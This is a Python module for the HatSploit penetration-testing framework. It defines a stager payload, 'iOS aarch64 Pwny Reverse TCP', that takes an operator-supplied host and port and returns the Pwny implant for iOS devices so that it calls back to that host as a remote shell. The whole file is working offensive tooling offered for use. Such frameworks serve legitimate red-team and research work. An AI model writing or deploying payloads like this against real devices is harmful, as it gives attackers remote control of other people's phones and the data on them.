#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Pwny):
    details = {
        'Category': "stager",
        'Name': "iOS aarch64 Pwny Reverse TCP",
        'Payload': "apple_ios/aarch64/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Pwny reverse TCP payload for iOS aarch64.",
        'Architecture': "aarch64",
        'Platform': "apple_ios",
        'Session': PwnySession,
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        self.details['Arguments'] = self.encode_data(
            host=remote_host,
            port=remote_port
        )

        return (
            self.get_pwny(
                self.details['Platform'],
                self.details['Architecture']
            )
        )
